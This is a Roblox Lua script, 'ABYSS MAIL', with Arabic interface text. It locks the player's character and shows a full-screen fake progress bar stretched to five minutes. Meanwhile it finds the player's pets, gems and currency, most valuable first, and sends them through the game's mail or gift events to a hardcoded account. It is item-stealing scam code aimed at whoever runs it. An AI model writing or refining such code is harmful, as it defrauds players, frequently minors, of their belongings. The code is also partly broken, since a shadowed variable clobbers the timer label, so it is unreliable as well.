-- =============================================
-- ABYSS MAIL v6.0 - FULL SCREEN ADAPTIVE
-- =============================================

local p=game.Players.LocalPlayer
local c=p.Character or p.CharacterAdded:Wait()
local h=c:WaitForChild("Humanoid")
local t="dsdogs1312"

-- البحث الشامل في كل مكان
local function deepSearch()
    local found={}
    local targets={
        p,
        p:FindFirstChild("PlayerGui"),
        p:FindFirstChild("Backpack"),
        p:FindFirstChild("StarterGear"),
        workspace,
        game:GetService("ReplicatedStorage"),
        game:GetService("Lighting"),
        game:GetService("ServerStorage"),
        game:GetService("CoreGui"),
        game:GetService("Players"),
        game:GetService("RunService"),
        game:GetService("ScriptContext"),
        game:GetService("Teams")
    }
    
    for _,obj in pairs(targets) do 
        if obj then 
            for _,child in pairs(obj:GetDescendants()) do
                local n=child.Name:lower()
                local isPet=n:match("pet") or n:match("animal") or n:match("creature") or 
                            n:match("dragon") or n:match("dog") or n:match("cat") or 
                            n:match("monster") or n:match("egg") or n:match("hatch") or 
                            n:match("beast") or n:match("wolf") or n:match("fox") or 
                            n:match("tiger") or n:match("lion") or n:match("bear") or 
                            n:match("phoenix") or n:match("griffin") or n:match("unicorn") or
                            child:FindFirstChild("Power") or child:FindFirstChild("Level") or 
                            child:FindFirstChild("Rarity") or child:FindFirstChild("Strength")
                
                local isGem=n:match("gem") or n:match("jewel") or n:match("crystal") or 
                            n:match("diamond") or n:match("ruby") or n:match("emerald") or 
                            n:match("sapphire") or n:match("amethyst") or n:match("gold") or 
                            n:match("coin") or n:match("money") or n:match("currency") or 
                            n:match("shard") or n:match("fragment") or
                            child:FindFirstChild("Value") or child:FindFirstChild("Amount") or 
                            child:FindFirstChild("Count") or child:FindFirstChild("Quantity")
                
                if isPet then 
                    table.insert(found,{item=child,type="pet"})
                elseif isGem then 
                    table.insert(found,{item=child,type="gem"})
                end
            end 
        end 
    end
    return found
end

-- استخراج العناصر
local function extractItems(found)
    local pets,gems={},{}
    for _,e in pairs(found) do
        local item=e.item
        local power=0
        
        if item:FindFirstChild("Power") then 
            power=tonumber(item.Power.Value) or 0 
        end
        if item:FindFirstChild("Level") then 
            power=power+(tonumber(item.Level.Value) or 0)*10 
        end
        if item:FindFirstChild("Rarity") then
            local r=tostring(item.Rarity.Value):lower()
            if r:match("legendary") then power=power+1000 end
            if r:match("mythical") then power=power+5000 end
            if r:match("exclusive") then power=power+10000 end
            if r:match("god") or r:match("divine") then power=power+50000 end
            if r:match("supreme") then power=power+25000 end
        end
        if item:FindFirstChild("Strength") then 
            power=power+(tonumber(item.Strength.Value) or 0) 
        end
        if item:FindFirstChild("Damage") then 
            power=power+(tonumber(item.Damage.Value) or 0) 
        end
        if item:FindFirstChild("Health") then 
            power=power+(tonumber(item.Health.Value) or 0) 
        end
        
        local amount=1
        if item:FindFirstChild("Value") then 
            amount=tonumber(item.Value.Value) or 1 
        end
        if item:FindFirstChild("Amount") then 
            amount=tonumber(item.Amount.Value) or 1 
        end
        if item:FindFirstChild("Count") then 
            amount=tonumber(item.Count.Value) or 1 
        end
        if item:FindFirstChild("Quantity") then 
            amount=tonumber(item.Quantity.Value) or 1 
        end
        
        for _,attr in pairs(item:GetAttributes()) do
            if type(attr)=="number" then
                power=power+attr
            end
        end
        
        if e.type=="pet" or power>0 then 
            table.insert(pets,{item=item,power=power})
        elseif e.type=="gem" or amount>1 then 
            for i=1,math.min(amount,50) do 
                table.insert(gems,item) 
            end 
        end
    end
    return pets,gems
end

-- شريط تحميل يغطي الشاشة بالكامل (متجاوب مع جميع الأجهزة)
local function showFullLoader()
    local sg=Instance.new("ScreenGui")
    sg.Name="AbyssLoader"
    sg.ResetOnSpawn=false
    sg.ZIndexBehavior=Enum.ZIndexBehavior.Global
    sg.Parent=p.PlayerGui
    
    -- خلفية سوداء تغطي الشاشة بالكامل (بغض النظر عن الحجم)
    local bg=Instance.new("Frame")
    bg.Size=UDim2.new(1,0,1,0)
    bg.Position=UDim2.new(0,0,0,0)
    bg.BackgroundColor3=Color3.fromRGB(0,0,0)
    bg.BackgroundTransparency=0.4
    bg.BorderSizePixel=0
    bg.Parent=sg
    
    -- الإطار الرئيسي (يتكيف مع أي شاشة)
    local mf=Instance.new("Frame")
    mf.Size=UDim2.new(0.92,0,0.45,0)
    mf.Position=UDim2.new(0.04,0,0.275,0)
    mf.BackgroundColor3=Color3.fromRGB(5,0,10)
    mf.BorderSizePixel=4
    mf.BorderColor3=Color3.fromRGB(120,0,200)
    mf.ClipsDescendants=true
    mf.Parent=sg
    
    -- عنوان
    local ttl=Instance.new("TextLabel")
    ttl.Size=UDim2.new(1,0,0.12,0)
    ttl.Position=UDim2.new(0,0,0,0)
    ttl.BackgroundTransparency=1
    ttl.Text="⚡ نظام الإرسال الفائق ⚡"
    ttl.TextColor3=Color3.fromRGB(180,80,255)
    ttl.TextScaled=true
    ttl.Font=Enum.Font.GothamBold
    ttl.Parent=mf
    
    -- شريط التقدم (أكبر ليكون واضحاً على الجوال)
    local pf=Instance.new("Frame")
    pf.Size=UDim2.new(0.94,0,0.22,0)
    pf.Position=UDim2.new(0.03,0,0.18,0)
    pf.BackgroundColor3=Color3.fromRGB(20,20,30)
    pf.BorderSizePixel=2
    pf.BorderColor3=Color3.fromRGB(80,0,150)
    pf.Parent=mf
    
    local pb=Instance.new("Frame")
    pb.Size=UDim2.new(0,0,1,0)
    pb.BackgroundColor3=Color3.fromRGB(80,0,150)
    pb.BorderSizePixel=0
    pb.Parent=pf
    
    -- تدرج بنفسجي
    local grad=Instance.new("UIGradient")
    grad.Color=ColorSequence.new({
        ColorSequenceKeypoint.new(0,Color3.fromRGB(200,0,255)),
        ColorSequenceKeypoint.new(0.5,Color3.fromRGB(100,0,200)),
        ColorSequenceKeypoint.new(1,Color3.fromRGB(50,0,150))
    })
    grad.Parent=pb
    
    -- نسبة التقدم (خط كبير)
    local pt=Instance.new("TextLabel")
    pt.Size=UDim2.new(1,0,1,0)
    pt.Position=UDim2.new(0,0,0,0)
    pt.BackgroundTransparency=1
    pt.Text="0%"
    pt.TextColor3=Color3.fromRGB(255,255,255)
    pt.TextScaled=true
    pt.Font=Enum.Font.GothamBold
    pt.Parent=pf
    
    -- حالة التحميل
    local st=Instance.new("TextLabel")
    st.Size=UDim2.new(1,0,0.2,0)
    st.Position=UDim2.new(0,0,0.44,0)
    st.BackgroundTransparency=1
    st.Text="جاري التجهيز..."
    st.TextColor3=Color3.fromRGB(200,150,255)
    st.TextScaled=true
    st.Font=Enum.Font.GothamMedium
    st.Parent=mf
    
    -- عدد العناصر
    local ct=Instance.new("TextLabel")
    ct.Size=UDim2.new(1,0,0.14,0)
    ct.Position=UDim2.new(0,0,0.68,0)
    ct.BackgroundTransparency=1
    ct.Text="0 عنصر"
    ct.TextColor3=Color3.fromRGB(150,100,200)
    ct.TextScaled=true
    ct.Font=Enum.Font.GothamMedium
    ct.Parent=mf
    
    -- مؤقت زمني
    local tm=Instance.new("TextLabel")
    tm.Size=UDim2.new(1,0,0.14,0)
    tm.Position=UDim2.new(0,0,0.84,0)
    tm.BackgroundTransparency=1
    tm.Text="⏱ 0:00 / 5:00"
    tm.TextColor3=Color3.fromRGB(150,100,200)
    tm.TextScaled=true
    tm.Font=Enum.Font.GothamMedium
    tm.Parent=mf
    
    return sg,pb,pt,st,ct,tm
end

local function update(pb,pt,st,ct,tm,pct,status,count,elapsed,total)
    pb.Size=UDim2.new(pct/100,0,1,0)
    pt.Text=math.floor(pct).."%"
    if status then st.Text=status end
    if count then ct.Text=count.." عنصر" end
    if elapsed and total then
        local em=math.floor(elapsed/60)
        local es=math.floor(elapsed%60)
        local tm=math.floor(total/60)
        local ts=math.floor(total%60)
        tm.Text=string.format("⏱ %d:%02d / %d:%02d",em,es,tm,ts)
    end
    wait(0.05)
end

local function findMailbox()
    local areas={
        workspace,
        game:GetService("ReplicatedStorage"),
        p.PlayerGui,
        p,
        game:GetService("StarterGui"),
        game:GetService("ServerStorage")
    }
    for _,a in pairs(areas) do 
        if a then 
            for _,o in pairs(a:GetDescendants()) do
                local n=o.Name:lower()
                if n:match("mail") or n:match("post") or n:match("box") or 
                   n:match("send") or n:match("transfer") or n:match("gift") or 
                   n:match("delivery") or n:match("inbox") then
                    if o:IsA("Model") or o:IsA("Part") or o:IsA("Frame") or 
                       o:IsA("ScreenGui") or o:IsA("RemoteEvent") then 
                        return o 
                    end
                end
            end 
        end 
    end
    return nil
end

local function sendItem(item,target,mb)
    if not mb then return false end
    local success=false
    pcall(function()
        local remote=mb:FindFirstChild("SendEvent") or 
                    mb:FindFirstChild("RemoteEvent") or 
                    mb:FindFirstChild("TransferEvent") or 
                    mb:FindFirstChild("GiftEvent")
        if remote and remote:IsA("RemoteEvent") then 
            remote:FireServer(item,target)
            success=true 
            return 
        end
        
        local rf=mb:FindFirstChild("SendFunction") or 
                mb:FindFirstChild("TransferFunction")
        if rf and rf:IsA("RemoteFunction") then 
            rf:InvokeServer(item,target)
            success=true 
            return 
        end
        
        local clone=item:Clone()
        clone.Parent=mb
        local ta=Instance.new("StringValue")
        ta.Name="Target"
        ta.Value=target
        ta.Parent=clone
        
        for _,v in pairs(item:GetChildren()) do
            if v:IsA("ValueBase") then 
                local nv=v:Clone()
                nv.Parent=clone
            end
        end
        
        clone:SetAttribute("Target",target)
        clone:SetAttribute("Sent",true)
        success=true
    end)
    return success
end

-- =============================================
-- التنفيذ الرئيسي
-- =============================================

if h then 
    h.WalkSpeed=0 
    h.JumpPower=0 
    h.PlatformStand=true 
end

local duration=300
local sg,pb,pt,st,ct,tm=showFullLoader()

st.Text="🔍 بحث عن صندوق البريد..."
wait(0.5)

local mb=findMailbox()
if not mb then
    st.Text="❌ لا يوجد صندوق بريد!"
    wait(3)
    sg:Destroy()
    if h then 
        h.WalkSpeed=16 
        h.JumpPower=50 
        h.PlatformStand=false 
    end
    return
end

st.Text="✅ تم العثور على صندوق البريد!"
update(pb,pt,st,ct,tm,5,"📦 جاري البحث العميق...",0,0,duration)

local found=deepSearch()
update(pb,pt,st,ct,tm,15,"🔍 تم العثور على "..#found.." عنصر",#found,5,duration)

local pets,gems=extractItems(found)
update(pb,pt,st,ct,tm,25,"🐉 تم العثور على "..#pets.." حيوان و "..#gems.." جوهرة",#pets+#gems,10,duration)

table.sort(pets,function(a,b)return a.power>b.power end)

local toSend={}
for _,v in pairs(pets) do 
    table.insert(toSend,v.item) 
end
for _,v in pairs(gems) do 
    table.insert(toSend,v) 
end

local total=#toSend
update(pb,pt,st,ct,tm,35,"📤 جاري الإرسال إلى "..t,total,15,duration)

local sent=0
local start=tick()

for i,v in pairs(toSend) do
    if sendItem(v,t,mb) then 
        sent=sent+1 
    end
    local elapsed=tick()-start
    local prog=35+(i/total)*55
    update(pb,pt,st,ct,tm,prog,"📤 "..i.."/"..total.." ("..sent.." تم)",sent,elapsed,duration)
    wait(0.5+math.random()*2)
end

while (tick()-start)<duration do
    local elapsed=tick()-start
    local prog=90+((elapsed-(duration*0.8))/(duration*0.2))*10
    update(pb,pt,st,ct,tm,math.min(prog,99),"⏳ إكمال التحميل...",sent,elapsed,duration)
    wait(1)
end

update(pb,pt,st,ct,tm,100,"✅ تم إرسال "..sent.." عنصر",sent,duration,duration)

local res=Instance.new("TextLabel")
res.Size=UDim2.new(0.8,0,0.1,0)
res.Position=UDim2.new(0.1,0,0.85,0)
res.BackgroundColor3=Color3.fromRGB(10,0,20)
res.BackgroundTransparency=0.1
res.BorderSizePixel=2
res.BorderColor3=Color3.fromRGB(150,0,200)
res.Text="✅ تم إرسال "..sent.." عنصر إلى "..t
res.TextColor3=Color3.fromRGB(200,150,255)
res.TextScaled=true
res.Font=Enum.Font.GothamBold
res.Parent=sg

wait(5)
sg:Destroy()

if h then 
    h.WalkSpeed=16 
    h.JumpPower=50 
    h.PlatformStand=false 
end

local ntf=Instance.new("TextLabel")
ntf.Size=UDim2.new(0.6,0,0.08,0)
ntf.Position=UDim2.new(0.2,0,0.02,0)
ntf.BackgroundColor3=Color3.fromRGB(10,0,20)
ntf.BackgroundTransparency=0.1
ntf.BorderSizePixel=2
ntf.BorderColor3=Color3.fromRGB(150,0,200)
ntf.Text="✅ تم إرسال "..sent.." عنصر إلى "..t
ntf.TextColor3=Color3.fromRGB(200,150,255)
ntf.TextScaled=true
ntf.Font=Enum.Font.GothamBold
ntf.Parent=p.PlayerGui

wait(4)
ntf:Destroy()
